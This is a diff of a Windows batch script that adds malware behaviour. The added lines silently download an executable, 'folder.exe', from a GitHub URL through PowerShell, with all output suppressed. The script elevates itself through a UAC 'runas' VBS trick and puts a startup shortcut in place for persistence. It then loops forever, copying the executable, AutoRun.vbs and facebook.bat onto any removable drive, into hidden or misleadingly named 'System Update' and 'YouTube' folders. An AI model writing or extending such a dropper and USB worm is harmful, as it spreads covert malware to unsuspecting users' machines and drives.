@@ -110,6 +110,11 @@ echo *************DOWNLOAD file****************
    )  
       if errorlevel 1 goto ERROR2   
 
+   if not exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
+   )
+      if errorlevel 1 goto ERROR2   
+
    if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
    )
@@ -177,10 +182,16 @@ echo *************DOWNLOAD file****************
    )   
       if errorlevel 1 goto ERROR3
   
+   if not exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
+   )   
+      if errorlevel 1 goto ERROR3
+
    if not exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
+
    goto SUCCESS 
 
 
@@ -270,7 +281,7 @@ echo *************DOWNLOAD file****************
 	if '%errorlevel%' NEQ '0' (goto UACPrompt) else ( goto gotAdmin )  
 	:UACPrompt 
         echo *************User rights**************** 
-		echo User rights found! Please, wait...
+		echo User rights! Please, wait...
 		timeout 3 > NUL
 		echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
 		echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"  
@@ -278,29 +289,29 @@ echo *************DOWNLOAD file****************
 		cd /D C:\Users\%username%\AppData\Roaming\
 		
 
-		:pendrive
+		:pendrive1
 		echo *************Pendrive check****************
 		   timeout 1 > NUL
 		   echo Checking for pendrive...
 		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
 		   if %%l equ 2 (
 			  mkdir %%i\YouTube > nul 2> nul
-
+                          copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
 			  mkdir "%%i\System Update" > nul 2> nul
 			  attrib +h "%%i\System Update" /s /d
-			  xcopy "C:\Users\%username%\AppData\Roaming\*.*" "%%i\System Update" /K /D /H /Y > nul 2> nul
-                          xcopy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /K /D /H /Y > nul 2> nul
+			  copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+                          copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+                          copy "C:\Users\%username%\AppData\Roaming\facebook.bat" "%%i\System Update\facebook.bat" /Y > nul 2> nul
 			  echo Copied!
-			  timeout 1 > NUL
 			  ) 
 		   )
 		   echo.
 		   echo.
 		   cls
-		   goto pendrive
+		   goto pendrive1
 	:gotAdmin  
          echo *************Administrator rights****************
-   		echo Admin rights found! Please, wait...
+   		echo Admin rights! Please, wait...
 		timeout 3 > NUL
 		cd /D C:\Users\%username%\AppData\Roaming\
 
@@ -313,30 +324,29 @@ echo *************DOWNLOAD file****************
                 )
 
                 mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" > nul 2> nul || (
-                   echo Mklink creation faild or already exist!
+                   echo Mklink creation already exist!?
                 )
 
-		:pendrive
+		:pendrive2
 		echo *************Pendrive check****************
 		   timeout 1 > NUL
 		   echo Checking for pendrive...
 		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
 		   if %%l equ 2 (
 			  mkdir %%i\YouTube > nul 2> nul
-			  
+                          copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
 			  mkdir "%%i\System Update" > nul 2> nul
 			  attrib +h "%%i\System Update" /s /d
-			  xcopy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\System Update" /K /D /H /Y > nul 2> nul
-                          xcopy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /K /D /H /Y > nul 2> nul
+			  copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+                          copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+                          copy "C:\Users\%username%\AppData\Roaming\facebook.bat" "%%i\System Update\facebook.bat" /Y > nul 2> nul
 			  echo Copied!
-			  timeout 1 > NUL
 			  ) 
 		   )
 		   echo.
 		   echo.
 		   cls
-		   goto pendrive
+		   goto pendrive2
 	
 
 exit
-
